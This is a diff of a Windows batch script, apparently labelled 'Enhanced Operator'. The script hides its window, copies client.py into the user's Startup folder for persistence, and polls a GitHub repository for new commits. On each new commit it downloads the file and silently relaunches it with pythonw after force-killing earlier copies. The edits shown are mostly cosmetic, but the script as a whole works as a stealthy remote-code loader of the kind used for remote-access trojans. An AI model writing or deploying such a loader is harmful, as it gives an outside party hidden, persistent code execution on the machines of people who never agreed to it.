@@ -1,7 +1,7 @@
 @echo off
 setlocal enabledelayedexpansion
 
-:: Configuration
+:: Configuration (templated)
 set "GITHUB_USER=sky9262"
 set "GITHUB_REPO=abc"
 set "GITHUB_BRANCH=main"
@@ -11,12 +11,12 @@ set "GITHUB_API_URL=https://api.github.com/repos/%GITHUB_USER%/%GITHUB_REPO%/com
 set "STARTUP_DIR=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup"
 set "CLIENT_FILE=%STARTUP_DIR%\client.py"
 set "TEMP_FILE=%TEMP%\client_temp.py"
-set "LOG_FILE=%TEMP%\client.log"
-set "COMMIT_FILE=%TEMP%\last_commit.txt"
+set "LOG_FILE=%STARTUP_DIR%\client.log"
+set "COMMIT_FILE=%STARTUP_DIR%\last_commit.txt"
 set "CHECK_INTERVAL=3"
 
 :: Create log function
-call :LOG "=== Starting Enhanced Operator - Commit-Based Update Detection ==="
+call :LOG "=== Starting Enhanced Operator - Commit-Based Update Detection (Template) ==="
 call :LOG "GitHub User/Repo: %GITHUB_USER%/%GITHUB_REPO%"
 call :LOG "Branch: %GITHUB_BRANCH%"
 call :LOG "File: %GITHUB_FILE%"
@@ -33,13 +33,13 @@ if "%1" neq "hidden" (
 :MAIN_LOOP
 call :LOG "--- Starting check cycle ---"
 
-:: Check if startup directory exists, create if not
+:: Ensure startup directory exists
 if not exist "%STARTUP_DIR%" (
     call :LOG "Creating startup directory: %STARTUP_DIR%"
     mkdir "%STARTUP_DIR%"
 )
 
-:: Get latest commit SHA from GitHub API
+:: Fetch latest commit SHA from GitHub API
 call :LOG "Fetching latest commit SHA from GitHub API..."
 powershell -WindowStyle Hidden -Command ^
   "try { $response = Invoke-RestMethod -Uri '%GITHUB_API_URL%' -Headers @{'User-Agent'='Operator-Bot'} -TimeoutSec 10; $response.sha | Out-File -FilePath '%TEMP%\latest_commit.txt' -Encoding UTF8 -NoNewline; Write-Host 'Success: Latest commit fetched' } catch { Write-Host 'Error:' $_.Exception.Message; exit 1 }"
@@ -72,13 +72,13 @@ if exist "%COMMIT_FILE%" (
     call :LOG "No stored commit found - first run"
 )
 
-:: Check if client.py exists
+:: Ensure client.py exists
 if not exist "%CLIENT_FILE%" (
     call :LOG "Client.py not found - downloading..."
     goto DOWNLOAD_AND_UPDATE
 )
 
-:: Check if we have a new commit
+:: If new commit, update
 if "!stored_commit!" neq "!latest_commit!" (
     call :LOG "NEW COMMIT DETECTED - Update needed!"
     call :LOG "Old: !stored_commit!"
@@ -88,7 +88,7 @@ if "!stored_commit!" neq "!latest_commit!" (
     call :LOG "No new commits - checking if client is running..."
 )
 
-:: Check if client.py is running (improved detection)
+:: Check if client.py is running
 call :LOG "Checking if client.py is running..."
 set "client_running=0"
 
@@ -125,12 +125,11 @@ goto START_CLIENT
 :UPDATE_CLIENT
 call :LOG "=== UPDATING CLIENT ==="
 
-:: Kill existing client processes (more aggressive)
+:: Stop existing client processes
 call :LOG "Stopping all client processes..."
 powershell -WindowStyle Hidden -Command ^
   "Get-CimInstance Win32_Process | Where-Object { ($_.Name -eq 'python.exe' -or $_.Name -eq 'pythonw.exe') -and $_.CommandLine -like '*client.py*' } | ForEach-Object { try { Write-Host 'Killing PID:' $_.ProcessId; Stop-Process -Id $_.ProcessId -Force } catch {} }"
 
-:: Wait for processes to terminate
 timeout /t 3 /nobreak >nul 2>&1
 
 :: Force delete old client
@@ -159,7 +158,7 @@ goto START_CLIENT
 call :LOG "=== STARTING CLIENT ==="
 cd /d "%STARTUP_DIR%"
 
-:: Try to run client and capture any immediate errors
+:: Try pythonw then python with error logging
 call :LOG "Starting client.py with error logging..."
 start /B "" cmd /c "pythonw.exe "%CLIENT_FILE%" 2>"%STARTUP_DIR%\client_error.log""
 if %ERRORLEVEL% neq 0 (
@@ -172,8 +171,6 @@ if %ERRORLEVEL% neq 0 (
 )
 
 call :LOG "Client start command executed"
-
-:: Wait and check for errors
 timeout /t 2 /nobreak >nul 2>&1
 
 if exist "%STARTUP_DIR%\client_error.log" (
